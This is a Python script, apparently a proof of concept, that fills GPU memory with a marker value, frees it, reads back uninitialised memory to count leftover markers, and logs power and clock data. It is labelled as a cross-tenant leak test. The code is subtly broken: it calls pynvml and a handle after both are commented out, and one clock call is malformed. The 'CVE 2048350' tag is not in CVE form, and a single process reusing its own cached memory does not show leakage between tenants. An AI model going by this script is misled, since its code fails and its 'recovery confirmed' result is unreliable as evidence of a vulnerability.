import torch, time, csv, os, struct
from datetime import datetime

#pynvml removed
#handle removed
gpu_id = 0 if torch.cuda.device_count() > 0 else None
device = f'cuda:{gpu_id}'
os.makedirs("./results/t32", exist_ok=True)
csv_path = "./results/t32/t32_raw_100hz.csv"
MARKER = 1.23456789

with open(csv_path, "w") as f:
    csv.writer(f).writerow(["timestamp","phase","power_w","gpu_util_pct","mem_util_pct","vram_mb","mem_clock_mhz","sm_clock_mhz","pstate","marker_hits","read_attempt"])

def sample(duration, phase, marker_hits=0, read_attempt=0):
    start = time.time()
    with open(csv_path, "a") as f:
        w = csv.writer(f)
        while time.time() - start < duration:
            p = pynvml.nvmlDeviceGetPowerUsage(h)/1000.0
            u = pynvml.nvmlDeviceGetUtilizationRates(h)
            m = pynvml.nvmlDeviceGetMemoryInfo(h).used//1024//1024
            mc = pynvml.nvmlDeviceGetClockInfo(h.NVML_CLOCK_MEM)
            sc = pynvml.nvmlDeviceGetClockInfo(h.NVML_CLOCK_SM)
            ps = pynvml.nvmlDeviceGetPerformanceState(h)
            w.writerow([time.time(),phase,p,u.gpu,u.memory,m,mc,sc,ps,marker_hits,read_attempt])
            f.flush()
            time.sleep(0.01)

def read_marker_hits():
    probe = torch.empty(8192,8192,device=device,dtype=torch.float32)
    raw = probe.cpu().numpy().tobytes()
    float_vals = struct.unpack('f'*(len(raw)//4), raw)
    hits = sum(1 for v in float_vals if abs(v - MARKER) < 0.001)
    del probe
    return hits

print("=== T-32 CROSS-TENANT SIMULATION H200 100Hz ===")
print("Author: Manmohan Mike Bains CVE 2048350")
print("Start:", datetime.now().isoformat())

for run in range(5):
    print(f"\nRun {run+1}/5")
    tenant_a = torch.full((8192,8192), MARKER, device=device, dtype=torch.float32)
    torch.cuda.synchronize()
    sample(5,"tenant_a_loaded")
    del tenant_a
    torch.cuda.empty_cache()
    sample(2,"tenant_a_exited")
    hits1 = read_marker_hits()
    print(f"  Read 1 marker hits: {hits1}")
    sample(3,"tenant_b_read1", hits1, 1)
    torch.cuda.empty_cache()
    hits2 = read_marker_hits()
    print(f"  Read 2 after empty_cache hits: {hits2}")
    sample(3,"tenant_b_read2", hits2, 2)
    print(f"  RECOVERY CONFIRMED: {hits1 > 0 or hits2 > 0}")
    torch.cuda.empty_cache()

print("=== T-32 COMPLETE ===")
print("End:", datetime.now().isoformat())
